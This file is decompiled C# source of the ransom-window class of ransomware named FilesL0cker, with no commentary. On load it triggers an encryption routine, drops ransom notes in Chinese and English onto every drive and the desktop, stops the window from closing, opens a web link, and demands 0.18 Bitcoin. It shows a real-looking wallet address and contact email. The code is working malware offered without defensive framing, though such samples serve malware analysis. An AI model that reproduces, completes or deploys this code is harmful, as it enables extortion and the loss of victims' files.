using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;

namespace SF;

public class Form1 : Form
{
	private IContainer components = null;

	private TextBox textBox1;

	private Button button1;

	private TextBox textBox2;

	private Button button2;

	private Button button3;

	private TextBox textBox3;

	private PictureBox pictureBox1;

	private Label label1;

	private PictureBox pictureBox2;

	private Label label2;

	private Label label4;

	private Label label5;

	private Label label3;

	public static string MessageCN { get; } = "FilesL0cker RAN$OMWARE\r\n########################################### \r\n您所有的重要文件（数据库，文档，图像，视频，音乐等）已被加密！并且只有我们才能解密！\r\n要解密您的文件，请按照以下步骤操作：\r\n1.购买 0.18 比特币\r\n2.将 0.18 比特币发送到付款地址\r\n3.将您的ID通过电子邮件发送给我们，经核实后，我们将为您制作解密工具\r\n \r\n邮件地址：bakfiles@protonmail.com\r\n付款地址：3EZGS8P439PbBeiWjsGYjSSaRHn9CXKDRQ\r\n";


	public static string MessageEN { get; } = "FilesL0cker RAN$OMWARE\r\n########################################### \r\nAll your important files(database,documents,images,videos,music,etc.)have been encrypted!and only we can decrypt!\r\nTo decrypt your files,follow these steps:\r\n1.Buy 0.18 Bitcoin\r\n2.Send 0.18 Bitcoin to the payment address\r\n3.Email your ID to us,after verification,we will create a decryption tool for you.\r\n \r\nEmail:bakfiles@protonmail.com\r\nPayment:3EZGS8P439PbBeiWjsGYjSSaRHn9CXKDRQ\r\n";


	public Form1()
	{
		InitializeComponent();
	}

	protected override void OnFormClosing(FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
		((Form)this).OnFormClosing(e);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		string text = Encryption.Run();
		string[] logicalDrives = Directory.GetLogicalDrives();
		string[] array = logicalDrives;
		foreach (string text2 in array)
		{
			try
			{
				File.WriteAllText(text2 + "\\#解密我的文件#.txt", MessageCN + "您的ID\r\n注意复制完整\r\n" + text);
				File.WriteAllText(text2 + "\\#DECRYPT MY FILES#.txt", MessageEN + "Your ID:\r\n" + text);
			}
			catch (Exception)
			{
			}
		}
		try
		{
			File.WriteAllText(Main.DesktopDirectory + "\\#解密我的文件#.txt", MessageCN + "您的ID\r\n注意复制完整\r\n" + text);
			File.WriteAllText(Main.DesktopDirectory + "\\#DECRYPT MY FILES#.txt", MessageEN + "Your ID:\r\n" + text);
		}
		catch (Exception)
		{
		}
		((Control)textBox1).set_Text(text);
		Process.Start("https://2no.co/239Ys5");
	}

	private void textBox1_TextChanged(object sender, EventArgs e)
	{
	}

	private void button1_Click(object sender, EventArgs e)
	{
		Clipboard.SetText(((Control)textBox1).get_Text());
	}

	private void button2_Click(object sender, EventArgs e)
	{
		Clipboard.SetText(((Control)textBox2).get_Text());
	}

	private void button3_Click(object sender, EventArgs e)
	{
		Clipboard.SetText(((Control)textBox3).get_Text());
	}

	private void pictureBox1_Click(object sender, EventArgs e)
	{
		((Control)label1).set_Text("您所有的重要文件已被加密!");
		((Control)label2).set_Text("#发生了什么？\r\n您所有的重要文件（数据库，文档，图像，视频，音乐等）已被加密！并且只有我们才能解密！\r\n要解密您的文件，您需要从我们这里购买解密密钥，我们是唯一能够为您解密文件的人。\r\n\r\n#注意事项\r\n尝试重新安装系统并使用第三方工具解密文件将导致文件损坏，这意味着没有人可以解密您的文件\r\n（包括我们），如果您仍尝试自行解密文件，则需自行承担风险！\r\n\r\n#测试解密\r\n作为证明，您可以通过电子邮件向我们发送3个要解密的文件，我们会将恢复后的文件发送给您，\r\n以证明我们可以解密您的文件。\r\n\r\n#如何解密\r\n1.购买 0.18 比特币\r\n2.将 0.18 比特币发送到付款地址\r\n3.将您的ID通过电子邮件发送给我们，经核实后，我们将为您制作解密工具\r\n\r\n请记住，最坏的事情已经发生了，现在就看您的决心和行动了！");
		((Control)label3).set_Text("您的ID");
		((Control)label4).set_Text("邮件地址");
		((Control)label5).set_Text("付款地址");
		((Control)button1).set_Text("复制");
		((Control)button2).set_Text("复制");
		((Control)button3).set_Text("复制");
	}

	private void pictureBox2_Click(object sender, EventArgs e)
	{
		((Control)label1).set_Text("All your important files are encrypted!");
		((Control)label2).set_Text("#What happened?\r\nAll your important files(database,documents,images,videos,music,etc.)have been\r\nencrypted!and only we can decrypt!\r\nTo decrypt your files,you need to buy the decryption key from us.We are the only one\r\nwho can decrypt the file for you.\r\n\r\n#Attention\r\nTrying to reinstall the system and decrypting the file with a third-party tool will result\r\nin file corruption,which means no one can decrypt your file.(including us),if you still try\r\nto decrypt the file yourself,you do so at your own risk!\r\n\r\n#Test decryption\r\nAs a proof,you can email us 3 files to decrypt,and we will send you the recovered files\r\nto prove that we can decrypt your files.\r\n\r\n#How to decrypt\r\n1.Buy 0.18 Bitcoin\r\n2.Send 0.18 Bitcoin to the payment address\r\n3.Email your ID to us,after verification,we will create a decryption tool for you.\r\n\r\nRemember,bad things have happened,now look at your determination and action!");
		((Control)label3).set_Text("Your ID");
		((Control)label4).set_Text("Email");
		((Control)label5).set_Text("Payment");
		((Control)button1).set_Text("Copy");
		((Control)button2).set_Text("Copy");
		((Control)button3).set_Text("Copy");
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f4: Expected O, but got Unknown
		//IL_0128: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b5: Expected O, but got Unknown
		//IL_01e9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0286: Unknown result type (might be due to invalid IL or missing references)
		//IL_0290: Expected O, but got Unknown
		//IL_02c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_034d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0357: Expected O, but got Unknown
		//IL_038b: Unknown result type (might be due to invalid IL or missing references)
		//IL_041c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0426: Expected O, but got Unknown
		//IL_045a: Unknown result type (might be due to invalid IL or missing references)
		//IL_04f7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0501: Expected O, but got Unknown
		//IL_0535: Unknown result type (might be due to invalid IL or missing references)
		//IL_05bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_05c6: Expected O, but got Unknown
		//IL_0661: Unknown result type (might be due to invalid IL or missing references)
		//IL_066b: Expected O, but got Unknown
		//IL_0703: Unknown result type (might be due to invalid IL or missing references)
		//IL_070d: Expected O, but got Unknown
		//IL_07b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_07c0: Expected O, but got Unknown
		//IL_087d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0887: Expected O, but got Unknown
		//IL_093b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0945: Expected O, but got Unknown
		//IL_09f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a03: Expected O, but got Unknown
		//IL_0abb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ac5: Expected O, but got Unknown
		//IL_0bd0: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bda: Expected O, but got Unknown
		//IL_0bf1: Unknown result type (might be due to invalid IL or missing references)
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		textBox1 = new TextBox();
		button1 = new Button();
		textBox2 = new TextBox();
		button2 = new Button();
		button3 = new Button();
		textBox3 = new TextBox();
		pictureBox1 = new PictureBox();
		label1 = new Label();
		pictureBox2 = new PictureBox();
		label2 = new Label();
		label4 = new Label();
		label5 = new Label();
		label3 = new Label();
		((ISupportInitialize)pictureBox1).BeginInit();
		((ISupportInitialize)pictureBox2).BeginInit();
		((Control)this).SuspendLayout();
		((Control)textBox1).set_BackColor(Color.White);
		((TextBoxBase)textBox1).set_BorderStyle((BorderStyle)1);
		((Control)textBox1).set_Font(new Font("Verdana", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)textBox1).set_ForeColor(Color.Black);
		((Control)textBox1).set_Location(new Point(304, 435));
		((Control)textBox1).set_Margin(new Padding(4, 5, 4, 5));
		((Control)textBox1).set_Name("textBox1");
		((TextBoxBase)textBox1).set_ReadOnly(true);
		((Control)textBox1).set_Size(new Size(547, 23));
		((Control)textBox1).set_TabIndex(2);
		((Control)textBox1).add_TextChanged((EventHandler)textBox1_TextChanged);
		((Control)button1).set_AutoSize(true);
		((Control)button1).set_Font(new Font("微软雅黑", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)134));
		((Control)button1).set_ForeColor(Color.Black);
		((Control)button1).set_Location(new Point(857, 433));
		((Control)button1).set_Margin(new Padding(4, 5, 4, 5));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(57, 27));
		((Control)button1).set_TabIndex(14);
		((Control)button1).set_Text("复制");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)textBox2).set_BackColor(Color.White);
		((TextBoxBase)textBox2).set_BorderStyle((BorderStyle)1);
		((Control)textBox2).set_Font(new Font("Verdana", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)textBox2).set_ForeColor(Color.Black);
		((Control)textBox2).set_Location(new Point(304, 469));
		((Control)textBox2).set_Margin(new Padding(4, 5, 4, 5));
		((Control)textBox2).set_Name("textBox2");
		((TextBoxBase)textBox2).set_ReadOnly(true);
		((Control)textBox2).set_Size(new Size(227, 23));
		((Control)textBox2).set_TabIndex(15);
		((Control)textBox2).set_Text("bakfiles@protonmail.com");
		textBox2.set_TextAlign((HorizontalAlignment)2);
		((Control)button2).set_AutoSize(true);
		((Control)button2).set_Font(new Font("微软雅黑", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)134));
		((Control)button2).set_ForeColor(Color.Black);
		((Control)button2).set_Location(new Point(537, 467));
		((Control)button2).set_Margin(new Padding(4, 5, 4, 5));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Size(new Size(57, 27));
		((Control)button2).set_TabIndex(24);
		((Control)button2).set_Text("复制");
		((ButtonBase)button2).set_UseVisualStyleBackColor(true);
		((Control)button2).add_Click((EventHandler)button2_Click);
		((Control)button3).set_AutoSize(true);
		((Control)button3).set_Font(new Font("微软雅黑", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)134));
		((Control)button3).set_ForeColor(Color.Black);
		((Control)button3).set_Location(new Point(633, 500));
		((Control)button3).set_Margin(new Padding(4, 5, 4, 5));
		((Control)button3).set_Name("button3");
		((Control)button3).set_Size(new Size(57, 27));
		((Control)button3).set_TabIndex(26);
		((Control)button3).set_Text("复制");
		((ButtonBase)button3).set_UseVisualStyleBackColor(true);
		((Control)button3).add_Click((EventHandler)button3_Click);
		((Control)textBox3).set_BackColor(Color.White);
		((TextBoxBase)textBox3).set_BorderStyle((BorderStyle)1);
		((Control)textBox3).set_Font(new Font("Verdana", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)textBox3).set_ForeColor(Color.Black);
		((Control)textBox3).set_Location(new Point(304, 502));
		((Control)textBox3).set_Margin(new Padding(4, 5, 4, 5));
		((Control)textBox3).set_Name("textBox3");
		((TextBoxBase)textBox3).set_ReadOnly(true);
		((Control)textBox3).set_Size(new Size(323, 23));
		((Control)textBox3).set_TabIndex(25);
		((Control)textBox3).set_Text("3EZGS8P439PbBeiWjsGYjSSaRHn9CXKDRQ");
		textBox3.set_TextAlign((HorizontalAlignment)2);
		((Control)pictureBox1).set_BackColor(Color.Transparent);
		((Control)pictureBox1).set_BackgroundImage((Image)componentResourceManager.GetObject("pictureBox1.BackgroundImage"));
		((Control)pictureBox1).set_Cursor(Cursors.get_Hand());
		((Control)pictureBox1).set_Location(new Point(877, 6));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(32, 32));
		pictureBox1.set_TabIndex(27);
		pictureBox1.set_TabStop(false);
		((Control)pictureBox1).add_Click((EventHandler)pictureBox1_Click);
		((Control)label1).set_BackColor(Color.Transparent);
		((Control)label1).set_Font(new Font("Verdana", 20f, (FontStyle)1));
		((Control)label1).set_ForeColor(Color.White);
		((Control)label1).set_Location(new Point(218, 6));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(728, 32));
		((Control)label1).set_TabIndex(28);
		((Control)label1).set_Text("您所有的重要文件已被加密!");
		label1.set_TextAlign((ContentAlignment)32);
		((Control)pictureBox2).set_BackColor(Color.Transparent);
		((Control)pictureBox2).set_BackgroundImage((Image)componentResourceManager.GetObject("pictureBox2.BackgroundImage"));
		((Control)pictureBox2).set_Cursor(Cursors.get_Hand());
		((Control)pictureBox2).set_Location(new Point(915, 6));
		((Control)pictureBox2).set_Name("pictureBox2");
		((Control)pictureBox2).set_Size(new Size(32, 32));
		pictureBox2.set_TabIndex(29);
		pictureBox2.set_TabStop(false);
		((Control)pictureBox2).add_Click((EventHandler)pictureBox2_Click);
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_BackColor(Color.Transparent);
		((Control)label2).set_Font(new Font("Verdana", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_ForeColor(Color.Black);
		label2.set_ImageAlign((ContentAlignment)16);
		((Control)label2).set_Location(new Point(225, 52));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(696, 342));
		((Control)label2).set_TabIndex(31);
		((Control)label2).set_Text(componentResourceManager.GetString("label2.Text"));
		label2.set_TextAlign((ContentAlignment)16);
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_BackColor(Color.Transparent);
		((Control)label4).set_Font(new Font("Verdana", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label4).set_ForeColor(Color.Black);
		label4.set_ImageAlign((ContentAlignment)16);
		((Control)label4).set_Location(new Point(225, 472));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(72, 18));
		((Control)label4).set_TabIndex(33);
		((Control)label4).set_Text("邮件地址");
		label4.set_TextAlign((ContentAlignment)32);
		((Control)label5).set_AutoSize(true);
		((Control)label5).set_BackColor(Color.Transparent);
		((Control)label5).set_Font(new Font("Verdana", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label5).set_ForeColor(Color.Black);
		label5.set_ImageAlign((ContentAlignment)16);
		((Control)label5).set_Location(new Point(225, 505));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(72, 18));
		((Control)label5).set_TabIndex(34);
		((Control)label5).set_Text("付款地址");
		label5.set_TextAlign((ContentAlignment)16);
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_BackColor(Color.Transparent);
		((Control)label3).set_Font(new Font("Verdana", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label3).set_ForeColor(Color.Black);
		label3.set_ImageAlign((ContentAlignment)16);
		((Control)label3).set_Location(new Point(225, 438));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(59, 18));
		((Control)label3).set_TabIndex(35);
		((Control)label3).set_Text("您的ID");
		label3.set_TextAlign((ContentAlignment)32);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(8f, 19f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.White);
		((Control)this).set_BackgroundImage((Image)componentResourceManager.GetObject("$this.BackgroundImage"));
		((Control)this).set_BackgroundImageLayout((ImageLayout)0);
		((Form)this).set_ClientSize(new Size(969, 557));
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)pictureBox2);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Control)this).get_Controls().Add((Control)(object)label5);
		((Control)this).get_Controls().Add((Control)(object)label4);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)button3);
		((Control)this).get_Controls().Add((Control)(object)textBox3);
		((Control)this).get_Controls().Add((Control)(object)button2);
		((Control)this).get_Controls().Add((Control)(object)textBox2);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).set_Font(new Font("微软雅黑", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)134));
		((Control)this).set_ForeColor(Color.White);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_Margin(new Padding(4, 5, 4, 5));
		((Form)this).set_MaximizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("FilesLocker");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((ISupportInitialize)pictureBox1).EndInit();
		((ISupportInitialize)pictureBox2).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
